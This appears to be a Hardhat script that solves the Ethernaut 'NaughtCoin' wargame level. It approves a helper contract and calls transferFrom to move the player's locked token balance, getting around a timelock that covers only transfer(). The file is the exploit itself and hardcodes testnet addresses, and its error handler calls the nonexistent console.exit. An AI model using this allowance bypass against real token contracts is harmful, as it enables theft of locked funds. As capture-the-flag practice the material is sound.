const { ethers, network, getNamedAccounts } = require("hardhat")
const { developmentChains } = require("../helper-hardhat-config")

async function hack() {
    let naughtCoin, player, user, victim, playerBalance, userBalance

    if (developmentChains.includes(network.name)) {
        naughtCoin = await ethers.getContract("NaughtCoin")
        player = (await getNamedAccounts()).deployer
        user = (await getNamedAccounts()).user
        victim = naughtCoin.address
    } else {
        victim = "0x86A19F908f44CEBE248065c848335341fB933c51"
        player = "0x9606e11178a83C364108e99fFFD2f7F75C99d801"
        user = "0xdE38f68124EE110086a7c942915c25f6900437e2"
        naughtCoin = await ethers.getContractAt("NaughtCoin", victim)
    }

    const hackCoin = await ethers.getContract("HackNaughtCoin")
    // const supply = 1000000000000000000000000 //await naughtCoin.INITIAL_SUPPLY()

    playerBalance = await naughtCoin.balanceOf(player)
    userBalance = await naughtCoin.balanceOf(user)
    console.log(`*Initial* Player Balance: ${playerBalance} | User Balance: ${userBalance}`)

    try {
        await naughtCoin.approve(hackCoin.address, playerBalance)
        const allowance = await naughtCoin.allowance(player, hackCoin.address)
        console.log(`Allowance: ${allowance}`)
        await hackCoin.hack(victim, player, user, playerBalance)
        // await naughtCoin.transferFrom(player, user, playerBalance)
        console.log("Transfer success")
    } catch (e) {
        console.log(e)
    }

    playerBalance = await naughtCoin.balanceOf(player)
    userBalance = await naughtCoin.balanceOf(user)

    console.log(`*Final* Player Balance: ${playerBalance} | User Balance: ${userBalance}`)
}

hack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        console.exit(1)
    })
